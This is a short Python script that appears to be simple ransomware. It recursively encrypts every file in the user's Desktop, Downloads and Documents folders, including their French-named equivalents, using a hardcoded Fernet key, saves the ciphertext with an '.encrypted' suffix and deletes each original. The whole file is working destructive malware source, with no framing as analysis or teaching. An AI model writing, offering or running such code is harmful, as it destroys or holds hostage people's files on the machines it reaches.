import os
from pathlib import Path
from cryptography.fernet import Fernet

home = str(Path.home())

def absoluteFilePath(directory):
	for dirpath,_,filenames in os.walk(directory):
		for f in filenames:
			yield os.path.abspath(os.path.join(dirpath, f))

def cryptThisBoi(PathList):
	for i in PathList:
		with open(i, 'rb') as f:
			data = f.read()
			encrypted = fernet.encrypt(data)
			with open(i+'.encrypted', 'wb') as fr:
				fr.write(encrypted)
		os.remove(i)

list1 = absoluteFilePath(home+"/Desktop")
list2 = absoluteFilePath(home+"/Downloads")
list3 = absoluteFilePath(home+"/Documents")

list1fr = absoluteFilePath(home+"/Bureau")
list2fr = absoluteFilePath(home+"/Téléchargements")
list3fr = absoluteFilePath(home+"/documents")

key = 'T-aHOFJbZcAz9KzAbrwjdmQqRXXgRisp7dy7ERNj5MA='
fernet = Fernet(key)


cryptThisBoi(list1)
cryptThisBoi(list2)
cryptThisBoi(list3)

cryptThisBoi(list1fr)
cryptThisBoi(list2fr)
cryptThisBoi(list3fr)
